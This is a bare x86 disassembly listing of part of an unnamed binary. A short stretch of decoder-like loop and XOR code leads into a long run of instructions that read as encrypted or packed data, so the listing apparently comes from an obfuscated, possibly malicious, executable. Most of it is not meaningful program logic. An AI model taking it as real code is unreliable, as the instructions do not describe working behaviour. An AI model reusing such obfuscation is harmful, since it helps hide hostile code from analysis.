  401836:	idiv   esi
  401838:	sbb    esi,ecx
  40183a:	adc    ebp,edi
  40183c:	gs jl  0x401839
  40183f:	cs scas al,BYTE PTR es:[edi]
  401841:	sub    al,0xc3
  401843:	data16 sahf 
  401845:	fisubr DWORD PTR [ebx]
  401847:	inc    ecx
  401848:	rcr    BYTE PTR [ebx],0x89
  40184b:	inc    ebp
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430616
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e8e2,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x4306c6,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x4306c2,0x13
  401884:	cmp    DWORD PTR ds:0x4306c2,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x4306c2,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42ec24
  4018a9:	mov    ebx,DWORD PTR ds:0x4306c2
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x4306c2,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e8de,0x42e8e2
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x430632,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e8ea,0x4306c2
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x4306d2,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	(bad)  
  401915:	out    0x9b,al
  401917:	dec    esp
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x4018d4
  401921:	pop    es
  401922:	jno    0x40193b
  401924:	iret   
  401925:	iret   
  401926:	jle    0x401985
  401928:	aam    0xbe
  40192a:	mov    esp,0xa8fbac4c
  40192f:	push   ecx
  401930:	push   cs
  401931:	mov    ah,0x9e
  401933:	aad    0x86
  401935:	cmp    dh,bl
  401937:	or     ch,BYTE PTR [edi+0x1]
  40193a:	ret    
  40193b:	hlt    
  40193c:	add    ch,BYTE PTR [eax]
  40193e:	or     bl,BYTE PTR [eax-0x55]
  401941:	fistp  WORD PTR [edi+0x4ab640ae]
  401947:	in     al,0x59
  401949:	iret   
  40194a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40194b:	jne    0x40192d
  40194d:	out    dx,eax
  40194e:	add    eax,0x93585bf6
  401953:	sbb    bl,BYTE PTR [esi-0x58e6c285]
  401959:	or     edi,eax
  40195b:	cmp    al,0xa4
  40195d:	fmulp  st(7),st
  40195f:	push   ebx
  401960:	popa   
  401961:	bound  edx,QWORD PTR [eax+0x2c]
  401964:	retf   
  401965:	mov    al,ds:0x5711d180
  40196a:	push   esp
  40196b:	or     ah,BYTE PTR [ecx+ebp*1+0x65]
  40196f:	fs pop ds
  401971:	cwde   
  401972:	xchg   ebp,eax
  401973:	xchg   edi,eax
  401974:	ja     0x401955
  401976:	jge    0x4019e7
  401978:	push   edx
  401979:	xor    edi,DWORD PTR [ecx+0x4f14d7c2]
  40197f:	mov    al,0x3b
  401981:	(bad)  
  401982:	inc    ebp
  401983:	sbb    dl,bl
  401985:	add    eax,0x1ddad8f4
  40198a:	mov    al,ds:0xd9ce5fb0
  40198f:	mov    bh,0x81
  401991:	mov    edi,fs
  401993:	and    eax,0x43a628b2
  401998:	out    dx,eax
  401999:	jnp    0x4019ef
  40199b:	add    al,0x55
  40199d:	jg     0x4019e7
  40199f:	ins    DWORD PTR es:[edi],dx
  4019a0:	movzx  ecx,BYTE PTR [esi+ebx*8+0x2287bf0c]
  4019a8:	fs dec ecx
  4019aa:	mov    ch,0x27
  4019ac:	(bad)  
  4019ad:	dec    eax
  4019ae:	dec    edi
  4019af:	hlt    
  4019b0:	sti    
  4019b1:	sub    eax,0x4a37da74
  4019b6:	call   0xb6db6569
  4019bb:	daa    
  4019bc:	cmp    BYTE PTR [ebx-0x69],dl
  4019bf:	mov    al,ds:0x538ae62b
  4019c4:	and    bl,bl
  4019c6:	adc    dh,al
  4019c8:	rcl    BYTE PTR [edi+0x53c1aec2],cl
  4019ce:	sub    al,0xbd
  4019d0:	jae    0x401981
  4019d2:	mov    edx,0x63dbc6a
  4019d7:	add    BYTE PTR [ebp+eax*8-0x4a],al
  4019db:	xor    al,0x23
  4019dd:	xchg   edi,eax
  4019de:	push   esp
  4019df:	les    ecx,FWORD PTR gs:[ebx-0x79]
  4019e3:	jbe    0x4019fb
  4019e5:	sub    dl,cl
  4019e7:	rol    esp,0x44
  4019ea:	adc    al,0x4a
  4019ec:	jmp    0x5419:0x55a72115
  4019f3:	imul   ecx,ebp,0xffffffef
  4019f6:	int3   
  4019f7:	int3   
  4019f8:	shl    BYTE PTR [eax],0xa8
  4019fb:	sub    eax,0x3c94b9e0
  401a00:	sub    esi,DWORD PTR gs:[edx-0x5339074a]
  401a07:	cmp    ch,bl
  401a09:	push   ebx
  401a0a:	aam    0x60
  401a0c:	mov    ebp,0xa09c2b75
  401a11:	mov    WORD PTR [ecx+0xd5d8fd0],?
  401a17:	sub    al,0x35
  401a1a:	push   esp
  401a1b:	je     0x401a53
  401a1d:	push   ebp
  401a1e:	add    DWORD PTR [ebx+edi*8-0x7a],0x48d3f421
  401a26:	dec    edx
  401a27:	dec    esp
  401a28:	pop    es
  401a29:	fcom   st(4)
  401a2b:	sbb    ecx,DWORD PTR [ebx]
  401a2d:	pop    edi
  401a2e:	add    DWORD PTR es:[edi-0x13],0x51
  401a33:	pop    esp
  401a34:	and    al,0xe9
  401a36:	xor    al,0xcd
  401a38:	iret   
  401a39:	jp     0x401a8e
  401a3b:	xlat   BYTE PTR ds:[ebx]
  401a3c:	dec    edi
  401a3d:	loope  0x401a93
  401a3f:	mov    edx,0xfbe8b638
  401a44:	mov    al,ch
  401a46:	data16 into 
  401a48:	pop    eax
  401a49:	jo     0x4019e4
  401a4b:	xchg   edi,eax
  401a4c:	add    al,BYTE PTR [ebx-0x32]
  401a4f:	dec    edx
  401a50:	xchg   edi,eax
  401a51:	pop    eax
  401a52:	loop   0x4019e5
  401a54:	or     edx,DWORD PTR [eax]
  401a56:	call   0x7d206b1f
  401a5b:	stos   DWORD PTR es:[edi],eax
  401a5c:	int    0x53
  401a5e:	fst    QWORD PTR [ecx]
  401a60:	repnz stos BYTE PTR es:[edi],al
  401a62:	cdq    
  401a63:	cmp    eax,0x566d806d
  401a68:	mov    ds:0xebfe0989,eax
  401a6d:	sub    eax,0x581ac2ef
  401a72:	sub    ebx,edx
  401a74:	jecxz  0x401a5d
  401a76:	ins    BYTE PTR es:[edi],dx
  401a77:	in     eax,dx
  401a78:	loop   0x4019fe
  401a7a:	nop
  401a7b:	inc    eax
  401a7c:	inc    ebx
  401a7d:	jno    0x401ac5
  401a7f:	es dec ebx
  401a81:	into   
  401a82:	imul   edi,DWORD PTR [ebx-0x7e9204c],0xffffff95
  401a89:	mov    ch,0xdb
  401a8b:	xchg   esi,eax
  401a8c:	mov    eax,0x3928c3a5
  401a91:	int    0xe7
  401a93:	pop    esi
  401a94:	xchg   DWORD PTR [ebp-0x4a],edi
  401a97:	pop    edx
  401a98:	(bad)  
  401a99:	or     al,0x6b
  401a9b:	and    al,0x63
  401a9d:	inc    esi
  401a9e:	xchg   ebx,eax
  401a9f:	dec    eax
  401aa0:	dec    eax
  401aa1:	adc    BYTE PTR [edx],ch
  401aa3:	sub    eax,0x5e557456
  401aa8:	or     al,0xb9
  401aaa:	mov    ds:0x8d48e026,eax
  401aaf:	xlat   BYTE PTR ds:[ebx]
  401ab0:	adc    eax,0xed68ad01
  401ab5:	pop    ss
  401ab6:	mov    ?,ebx
  401ab8:	jnp    0x401ad1
  401aba:	add    al,0x6e
  401abc:	cmp    ah,dh
  401abe:	mov    esp,0x89532b32
  401ac3:	jg     0x401aa3
  401ac5:	adc    eax,0x5b6e7ce4
  401aca:	jp     0x401aa2
  401acc:	test   DWORD PTR [eax],esp
  401ace:	xchg   esp,eax
  401acf:	fistp  QWORD PTR [edx]
  401ad1:	sub    DWORD PTR [ebx-0x75e1b068],0xffffffdc
  401ad8:	dec    esi
  401ad9:	out    0xc0,eax
  401adb:	cmp    edx,DWORD PTR [ecx-0x97f87e7]
  401ae1:	push   edx
  401ae2:	inc    BYTE PTR [edi+0x55]
  401ae5:	mov    WORD PTR [ecx-0x24],cs
  401ae8:	adc    BYTE PTR [edx+eiz*2-0x30],ch
  401aec:	jg     0x401aee
  401aee:	out    0x8,eax
  401af0:	lock stos DWORD PTR es:[edi],eax
  401af2:	pop    edx
  401af3:	mov    bl,0xee
  401af5:	inc    eax
  401af6:	outs   dx,DWORD PTR ds:[esi]
  401af7:	repnz mov ecx,0xf9e24f98
  401afd:	mov    BYTE PTR [edx-0x224e97d9],0xd5
  401b04:	push   eax
  401b05:	stos   DWORD PTR es:[edi],eax
  401b06:	jns    0x401b59
  401b08:	mov    eax,ds:0xb89aa62b
  401b0d:	pop    ebx
  401b0e:	sub    dl,ch
  401b10:	mov    dl,0xdd
  401b12:	enter  0x6c06,0x38
  401b16:	out    0x46,eax
  401b18:	mov    ah,0xea
  401b1a:	pop    edi
  401b1b:	xlat   BYTE PTR ds:[ebx]
  401b1c:	sub    BYTE PTR [ebp-0x5c],dl
  401b1f:	jl     0x401afe
  401b21:	faddp  st(6),st
  401b23:	mov    ebx,0xe632d9e8
  401b28:	mov    DWORD PTR [ebx-0xf9ed3a],ebx
  401b2e:	and    edx,DWORD PTR [ecx]
  401b30:	dec    esp
  401b31:	mov    eax,0xe4c69b23
  401b36:	jns    0x401af0
  401b38:	or     DWORD PTR [edi],0x59
  401b3b:	xchg   esp,eax
  401b3c:	jmp    0x14ed:0x7711339c
  401b43:	shr    BYTE PTR [ecx+0x77206449],1
  401b49:	sub    eax,0xd8f6a40
  401b4e:	cmp    al,0xf8
  401b50:	pop    ecx
  401b51:	(bad)  
  401b52:	sub    eax,0x4d36bda9
  401b57:	mov    bl,0xcb
  401b59:	mov    eax,0xff79bd0b
  401b5e:	scas   eax,DWORD PTR es:[edi]
  401b5f:	mov    al,ds:0xa8a7a84d
  401b64:	push   ebx
  401b65:	jae    0x401b33
  401b67:	xchg   DWORD PTR [eax+0x4fe71898],edx
  401b6d:	sbb    eax,DWORD PTR [ebx+0x4f67ceb]
  401b73:	cmp    esp,esi
  401b75:	stos   DWORD PTR es:[edi],eax
  401b76:	popa   
  401b77:	(bad)  
  401b78:	ins    DWORD PTR es:[edi],dx
  401b79:	jle    0x401bbf
  401b7b:	or     al,0xb4
  401b7d:	push   esi
  401b7e:	add    bh,BYTE PTR [ebx+0x32d60972]
  401b84:	sub    DWORD PTR [edi],ecx
  401b86:	and    bh,BYTE PTR [edi]
  401b88:	dec    eax
  401b89:	add    DWORD PTR [ebx-0x4c],edx
  401b8c:	jns    0x401b3f
  401b8e:	jl     0x401b38
  401b90:	test   eax,0x7d95d0c8
  401b95:	push   ds
  401b96:	mul    BYTE PTR [esi+0x750d5d82]
  401b9c:	stos   BYTE PTR es:[edi],al
  401b9d:	jle    0x401b5b
  401b9f:	push   ss
  401ba0:	jge    0x401b73
  401ba2:	push   edx
  401ba3:	sub    esp,0x3688b784
  401ba9:	and    DWORD PTR [edx],0xec108ea
  401baf:	rcr    BYTE PTR [ebp-0x2c595ab8],1
  401bb5:	and    eax,0xbd9d7622
  401bba:	cdq    
  401bbb:	push   ecx
  401bbc:	push   ecx
  401bbd:	sti    
  401bbe:	pop    edx
  401bbf:	pop    ds
  401bc0:	ins    BYTE PTR es:[edi],dx
  401bc1:	pop    esi
  401bc2:	int    0xd7
  401bc4:	mov    ebp,0x50129c3c
  401bc9:	out    0x2c,eax
  401bcb:	call   0xbc1af246
  401bd0:	xchg   bp,ax
  401bd2:	fisubr DWORD PTR [edx+0x51987ea5]
  401bd8:	inc    ecx
  401bd9:	xchg   edi,eax
  401bda:	dec    edx
  401bdb:	out    dx,eax
  401bdc:	das    
  401bdd:	dec    ebp
  401bde:	cmp    DWORD PTR [edx],ecx
  401be0:	mov    dh,0xab
  401be2:	and    al,BYTE PTR [esi+0x75]
  401be5:	xchg   esi,eax
  401be6:	pop    edx
  401be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401be8:	repz pop eax
  401bea:	cdq    
  401beb:	mov    cs,WORD PTR [ebp-0x68]
  401bee:	rol    DWORD PTR [ecx+0x25],0x40
  401bf2:	shl    DWORD PTR [ebp-0x65],1
  401bf5:	inc    esi
  401bf6:	or     al,0x7a
  401bf8:	or     BYTE PTR [ebx-0x45c81bb1],ch
  401bfe:	retf   
  401bff:	repz mov si,0x3d84
  401c04:	mov    ?,WORD PTR [ecx]
  401c06:	fcom   QWORD PTR [esi+edi*8-0x54997624]
  401c0d:	std    
  401c0e:	dec    eax
  401c0f:	dec    esi
  401c10:	shr    DWORD PTR [eax+0x39aa302b],0x4e
  401c17:	add    BYTE PTR [edx+0x36c4fee7],bl
  401c1d:	pushf  
  401c1e:	add    DWORD PTR [ebx+0x3c004558],ebp
  401c24:	jmp    0x97cbb890
  401c29:	call   0xdecd4044
  401c2e:	in     al,0xa1
  401c30:	test   dl,bl
  401c32:	shl    BYTE PTR [ebx+ecx*4+0x64],cl
  401c36:	lahf   
  401c37:	jl     0x401c28
  401c39:	lods   eax,DWORD PTR ds:[esi]
  401c3a:	or     al,0x23
  401c3c:	push   ss
  401c3d:	cwde   
  401c3e:	cmp    ch,ah
  401c40:	ja     0x401c64
  401c42:	mov    bl,0x14
  401c44:	sub    al,0xd0
  401c46:	sbb    BYTE PTR [edx-0x61f42901],cl
  401c4c:	add    al,0xbf
  401c4e:	cli    
  401c4f:	push   eax
  401c50:	cmp    ebx,ebx
  401c52:	js     0x401c1a
  401c54:	sbb    bl,bh
  401c56:	jge    0x401cce
  401c58:	and    DWORD PTR [eax+edx*4-0x10c446a4],ebp
  401c5f:	pop    edi
  401c60:	sub    ecx,DWORD PTR [eax+0x59]
  401c63:	mul    eax
  401c65:	call   0x1620:0x35be7376
  401c6c:	addr16 std 
  401c6e:	(bad)  
  401c6f:	push   esp
  401c70:	fst    DWORD PTR [edx-0x28a8c514]
  401c76:	cmp    DWORD PTR [ebx],ecx
  401c78:	imul   edi,DWORD PTR [eax+0x52f8df30],0xd
  401c7f:	stc    
  401c80:	inc    ecx
  401c81:	(bad)  
  401c82:	hlt    
  401c83:	ja     0x401ce8
  401c85:	jg     0x401c09
  401c87:	cmp    eax,0xb35b2893
  401c8c:	aam    0x40
  401c8e:	cmc    
  401c8f:	xchg   ebx,ebp
  401c91:	mov    DWORD PTR [edi-0x4fc0278c],ebp
  401c97:	mov    DWORD PTR [eax+ebp*2-0x8d56f89],0xe860fc9c
  401ca2:	xor    BYTE PTR [eax-0x67804218],dl
  401ca8:	lea    edi,ds:[ebp+0x4e]
  401cac:	add    DWORD PTR [edx+eiz*8-0x6d],ecx
  401cb0:	idiv   DWORD PTR [esi-0x6c]
  401cb3:	mov    bh,0xf7
  401cb5:	xrelease mov DWORD PTR ds:0x42efa0,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c5f
  401cd2:	add    ch,BYTE PTR [ebp+0x7e08baa8]
  401cd8:	jle    0x401c5c
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401ce2
  401cde:	fld    QWORD PTR [edx+0x30]
  401ce1:	and    eax,0x8222e4f6
  401ce6:	inc    edi
  401ce7:	and    eax,0x525ca2ba
  401cec:	mov    dl,BYTE PTR [edi]
  401cee:	in     eax,0x60
  401cf0:	lea    ebp,[esi-0x69]
  401cf3:	or     edi,DWORD PTR [edx]
  401cf5:	add    dl,dl
  401cf7:	sar    DWORD PTR [eax+ecx*1-0x5],0x99
  401cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cfd:	sbb    esp,DWORD PTR [edx-0x65]
  401d00:	arpl   WORD PTR [ecx-0x4f],si
  401d03:	in     al,dx
  401d04:	aaa    
  401d05:	sbb    esi,DWORD PTR [edi+esi*1]
  401d08:	mov    dl,BYTE PTR [ebp+ebp*2-0x7cc09092]
  401d0f:	mov    bl,0x7b
  401d11:	xor    eax,0x4eeb89e
  401d16:	mov    bl,0x3a
  401d18:	mov    DWORD PTR [edx],esi
  401d1a:	xchg   ecx,eax
  401d1b:	sub    eax,0x346b8ee2
  401d20:	sbb    eax,DWORD PTR [ebp+0x77]
  401d23:	neg    BYTE PTR [esp+edi*4-0x36]
  401d27:	das    
  401d28:	inc    ebx
  401d29:	sbb    BYTE PTR [ebx+0x3c],ch
  401d2c:	push   0xffffffe2
  401d2e:	pop    ds
  401d2f:	jl     0x401d11
  401d31:	adc    ah,BYTE PTR [edx-0x79296b0c]
  401d37:	loop   0x401ce9
  401d39:	and    al,0x4c
  401d3b:	aaa    
  401d3c:	cdq    
  401d3d:	leave  
  401d3e:	mov    edi,0xb74ed0e5
  401d43:	sbb    al,0xca
  401d45:	mov    ah,bl
  401d47:	sub    esp,DWORD PTR [esi+0x59]
  401d4a:	jne    0x401d50
  401d4c:	mov    ah,0x79
  401d4e:	hlt    
  401d4f:	in     eax,0x4b
  401d51:	data16 mov cl,0x6
  401d54:	pushf  
  401d55:	push   eax
  401d56:	mov    BYTE PTR [edx],dh
  401d58:	xchg   DWORD PTR [esi+0x6cd61ed3],esp
  401d5e:	ror    DWORD PTR [ecx-0xcf8c02e],0xf
  401d65:	push   ebx
  401d66:	stos   BYTE PTR es:[edi],al
  401d67:	xor    ah,dh
  401d69:	fidivr WORD PTR [edx]
  401d6b:	pop    edi
  401d6c:	fdivr  QWORD PTR [ebx+ecx*2]
  401d6f:	or     eax,0x9128d127
  401d74:	lds    esi,FWORD PTR [ebx+0x352589d2]
  401d7a:	es leave 
  401d7c:	ds or  al,0x41
  401d7f:	nop
  401d80:	xchg   DWORD PTR ds:0xf4a73e72,esp
  401d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d87:	xor    ebx,DWORD PTR [ebp-0x75]
  401d8a:	sub    ebp,ecx
  401d8c:	aam    0xf6
  401d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d8f:	cwde   
  401d90:	pop    ds
  401d91:	ja     0x401db2
  401d93:	mov    bh,0xeb
  401d95:	add    al,0x89
  401d97:	jmp    0xda6551f1
  401d9c:	mov    esp,DWORD PTR [ebx-0x2155a249]
  401da2:	cmc    
  401da3:	push   ds
  401da4:	lea    edi,ds:0x1f1e05ee
  401daa:	mov    ds:0x28280ba8,al
  401daf:	gs xchg edi,eax
  401db1:	out    0x32,eax
  401db3:	leave  
  401db4:	hlt    
  401db5:	sub    ah,BYTE PTR [eax-0x32]
  401db8:	and    al,0xc8
  401dba:	out    dx,al
  401dbb:	les    eax,FWORD PTR [esi+0x6cfc484c]
  401dc1:	xor    BYTE PTR [esi-0x2],dh
  401dc4:	out    dx,al
  401dc5:	cmp    ch,BYTE PTR [ebp+0x31]
  401dc8:	xchg   ebx,eax
  401dc9:	into   
  401dca:	mov    BYTE PTR [ebx+0x6b],bl
  401dcd:	retf   
  401dce:	in     al,0x6c
  401dd0:	sbb    edi,DWORD PTR [esi+0x31]
  401dd3:	loopne 0x401d86
  401dd5:	aas    
  401dd6:	add    dh,BYTE PTR [edi+0x32]
  401dd9:	or     al,0x19
  401ddb:	xchg   ecx,eax
  401ddc:	cwde   
  401ddd:	xor    BYTE PTR [edi-0x6fc385b],al
  401de3:	inc    BYTE PTR [edi-0x69617ed1]
  401de9:	arpl   WORD PTR [ecx-0x773a2517],cx
  401def:	cmc    
  401df0:	call   0x1a71:0xa57b6f4b
  401df7:	dec    ecx
  401df8:	retf   0xa4f2
  401dfb:	dec    esi
  401dfc:	add    esi,DWORD PTR ds:0xefbb57ce
  401e02:	sub    ah,dl
  401e04:	nop
  401e05:	(bad)  
  401e06:	int    0x2
  401e08:	aaa    
  401e09:	std    
  401e0a:	in     eax,0xf0
  401e0c:	nop
  401e0d:	xchg   esp,eax
  401e0e:	pushf  
  401e0f:	enter  0x63ce,0x4f
  401e13:	and    eax,DWORD PTR [edi+0x6b997965]
  401e19:	int3   
  401e1a:	inc    ebx
  401e1b:	jnp    0x401e25
  401e1d:	div    ebx
  401e1f:	jbe    0x401e1c
  401e21:	pop    esi
  401e22:	dec    eax
  401e23:	jo     0x401dc3
  401e25:	add    esp,edi
  401e27:	popf   
  401e28:	cmp    esi,DWORD PTR ds:[esi+0x7e]
  401e2c:	(bad)  
  401e2e:	clc    
  401e2f:	sbb    ebp,esi
  401e31:	inc    ebp
  401e32:	and    bl,BYTE PTR [ebx-0x629521f1]
  401e38:	adc    eax,0x35f3b161
  401e3d:	pop    ecx
  401e3e:	adc    edi,ebp
  401e40:	mov    ds:0x2712703c,eax
  401e45:	repz dec ebx
  401e47:	repnz xchg ebp,eax
  401e49:	repz out 0x5d,eax
  401e4c:	(bad)  [ebx+0x1b]
  401e4f:	sar    BYTE PTR [eax+esi*1],0xb3
  401e53:	lods   eax,DWORD PTR ds:[esi]
  401e54:	int3   
  401e55:	dec    ebx
  401e56:	add    edx,DWORD PTR [eax-0x2ba18d93]
  401e5c:	jbe    0x401dfe
  401e5e:	jge    0x401ed0
  401e60:	cdq    
  401e61:	fwait
  401e62:	push   ds
  401e63:	jb     0x401e8d
  401e65:	je     0x401e63
  401e67:	fdiv   st,st(5)
  401e69:	mov    ?,WORD PTR [ebx-0x1dacae7]
  401e6f:	ins    DWORD PTR es:[edi],dx
  401e70:	rol    bh,1
  401e72:	rol    BYTE PTR [ebx+0x238addfc],1
  401e78:	leave  
  401e79:	adc    BYTE PTR [edi+0x29],al
  401e7c:	push   esi
  401e7d:	scas   al,BYTE PTR es:[edi]
  401e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e7f:	aaa    
  401e80:	daa    
  401e81:	dec    eax
  401e82:	adc    eax,0x124ac77a
  401e87:	push   edi
  401e88:	inc    ecx
  401e89:	fmul   DWORD PTR [esi+0x7b]
  401e8c:	dec    eax
  401e8d:	or     eax,DWORD PTR [edi-0x3bfd7e5e]
  401e93:	aam    0x31
  401e95:	inc    esi
  401e96:	cmp    al,0xb0
  401e98:	fs adc al,0x8
  401e9b:	jmp    0x6b98:0x7130aa00
  401ea2:	sub    esp,DWORD PTR [ebx+0x1770706d]
  401ea8:	add    al,0xfa
  401eaa:	and    al,0x3d
  401eac:	cdq    
  401ead:	add    DWORD PTR [ebx+0x6bcfc125],ebx
  401eb3:	dec    ebx
  401eb4:	lds    esp,FWORD PTR [esi]
  401eb6:	loope  0x401eca
  401eb8:	mov    esp,0xa3e3eea
  401ebd:	shr    DWORD PTR [ecx+0x134e91d],1
  401ec3:	ja     0x401f37
  401ec5:	push   ecx
  401ec6:	mov    al,0x3a
  401ec8:	fimul  WORD PTR [ecx+0x4]
  401ecb:	mov    bh,0x2d
  401ecd:	js     0x401e8d
  401ecf:	nop
  401ed0:	xchg   ecx,eax
  401ed1:	loop   0x401e66
  401ed3:	das    
  401ed4:	mov    eax,0x44a773d8
  401ed9:	xor    BYTE PTR [ebx+0x32],dh
  401edc:	(bad)  
  401edd:	mov    bh,0xb9
  401edf:	scas   al,BYTE PTR es:[edi]
  401ee0:	repz add BYTE PTR [esi-0x79],0x88
  401ee5:	stos   BYTE PTR es:[edi],al
  401ee6:	mov    ds:0x47a6c455,al
  401eeb:	aam    0xcb
  401eed:	repnz in eax,dx
  401eef:	bound  ebx,QWORD PTR [edi]
  401ef1:	xor    edx,DWORD PTR [ebx-0x51246a36]
  401ef7:	inc    ecx
  401ef8:	jp     0x401eac
  401efa:	inc    ebp
  401efb:	fld    QWORD PTR [edx]
  401efd:	int    0x77
  401eff:	mov    dh,0x73
  401f01:	jae    0x401ec2
  401f03:	mov    ds:0xcfe274a5,al
  401f08:	pop    esi
  401f09:	cs mov ah,0xf6
  401f0c:	xchg   ebx,eax
  401f0d:	not    DWORD PTR [ecx+0x6e6911d]
  401f13:	lahf   
  401f14:	fs lahf 
  401f16:	mov    ecx,DWORD PTR [edx+0x24]
  401f19:	mov    bl,ch
  401f1b:	pop    ebx
  401f1c:	mov    edi,0x7252b1e1
  401f21:	int3   
  401f22:	sti    
  401f23:	fs push ebx
  401f25:	cmp    eax,0x2f3c1547
  401f2a:	add    eax,0xa4eb5f90
  401f2f:	mov    bh,0x87
  401f31:	mov    ds:0xc95ede2c,eax
  401f36:	xor    eax,0x278f9906
  401f3b:	jge    0x401f5e
  401f3d:	icebp  
  401f3e:	retf   0xdfca
  401f41:	jno    0x401f5a
  401f43:	push   esi
  401f44:	in     eax,0x3b
  401f46:	lock ins BYTE PTR es:[edi],dx
  401f48:	jmp    0x6c41:0x84d0020c
  401f4f:	mov    esi,0x4e7f0b15
  401f54:	repz and ecx,DWORD PTR [esp+ecx*8]
  401f58:	cmc    
  401f59:	xchg   bl,bl
  401f5b:	jb     0x401f52
  401f5d:	jecxz  0x401f40
  401f5f:	cmp    cl,BYTE PTR [ebx]
  401f61:	pop    ecx
  401f62:	sbb    DWORD PTR [esi-0x70],ebp
  401f65:	inc    esp
  401f66:	add    ebp,DWORD PTR [ebx]
  401f68:	and    bl,0xb9
  401f6b:	and    al,0xb1
  401f6d:	std    
  401f6e:	mov    dl,0xb0
  401f70:	ins    BYTE PTR es:[edi],dx
  401f71:	scas   eax,DWORD PTR es:[edi]
  401f72:	rol    BYTE PTR [esi+0x3a2d4c25],1
  401f78:	in     al,0x2
  401f7a:	shr    DWORD PTR [ecx+eiz*1],cl
  401f7d:	jmp    0x74434e01
  401f82:	cmc    
  401f83:	mov    dh,ch
  401f85:	xor    BYTE PTR [esi+0x41],0x9f
  401f89:	pop    es
  401f8a:	leave  
  401f8b:	add    DWORD PTR [ebp+0x3373e2da],ebp
  401f91:	mov    eax,ds:0x2f5b56a3
  401f96:	sub    al,0x88
  401f98:	dec    ebx
  401f99:	imul   eax,DWORD PTR [ecx+0x2b],0x6ab2ff10
  401fa0:	lods   eax,DWORD PTR ds:[esi]
  401fa1:	ret    0xb981
  401fa4:	push   ebp
  401fa5:	xchg   edx,eax
  401fa6:	shl    edx,1
  401fa8:	shl    BYTE PTR [eax],0xc9
  401fab:	xlat   BYTE PTR ds:[ebx]
  401fac:	mov    esp,es
  401fae:	int    0x8
  401fb0:	xor    BYTE PTR [ebp+0x3cf9c089],ah
  401fb6:	gs push esp
  401fb8:	dec    esi
  401fb9:	push   esi
  401fba:	(bad)  
  401fbb:	(bad)  
  401fbc:	aam    0x66
  401fbe:	int    0x39
  401fc0:	data16 mov dh,0x88
  401fc3:	mov    bl,0x84
  401fc5:	test   al,0xed
  401fc7:	ins    DWORD PTR es:[edi],dx
  401fc8:	out    0x86,eax
  401fca:	std    
  401fcb:	iret   
  401fcc:	fstp   DWORD PTR ds:0x456b1541
  401fd2:	jbe    0x401ffd
  401fd4:	inc    edi
  401fd5:	das    
  401fd6:	maskmovq mm1,mm0
  401fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fda:	or     BYTE PTR [eax-0x1d],dl
  401fdd:	xor    dh,ch
  401fdf:	(bad)  
  401fe0:	cmp    esi,DWORD PTR [esp+eax*8+0x7644db2d]
  401fe7:	jae    0x401f89
  401fe9:	sub    DWORD PTR [esi-0xbc3cc97],edi
  401fef:	dec    ebx
  401ff0:	pop    ds
  401ff1:	lock call 0x3a73:0x7f047ec6
  401ff9:	daa    
  401ffa:	mov    edx,0x3803323
  401fff:	test   DWORD PTR [edi],0x487e8961
  402005:	data16 mov cl,0x32
  402008:	push   eax
  402009:	lock dec esi
  40200b:	jnp    0x402013
  40200d:	ds jo  0x40208d
  402010:	sub    esp,DWORD PTR [edx]
  402012:	or     ebp,DWORD PTR [edi]
  402014:	sti    
  402015:	mov    bh,0x1f
  402017:	pop    ss
  402018:	cmp    eax,0x7654e85e
  40201d:	mov    edi,0x4eb95977
  402022:	xchg   edi,eax
  402023:	call   0xa677:0xd7c2bba1
  40202a:	in     al,0xf
  40202c:	jmp    0x4cb2:0x34b9465a
  402033:	adc    eax,0xc103be8
  402038:	ins    DWORD PTR es:[edi],dx
  402039:	xor    edx,DWORD PTR [edx+0x79f3304c]
  40203f:	repnz xor eax,0x156a58c9
  402045:	jae    0x402099
  402047:	sub    eax,0xb28c53cc
  40204c:	mov    ebp,0xfc7481b0
  402051:	fld    QWORD PTR [ecx-0x70c37537]
  402057:	and    ebp,edi
  402059:	and    ch,BYTE PTR [edi+0x57f7503e]
  40205f:	and    eax,esi
  402061:	sub    eax,0xedd4e04e
  402066:	mov    bh,0x8f
  402068:	scas   al,BYTE PTR es:[edi]
  402069:	in     eax,0x81
  40206b:	scas   eax,DWORD PTR es:[edi]
  40206c:	mul    BYTE PTR [esi]
  40206e:	inc    edi
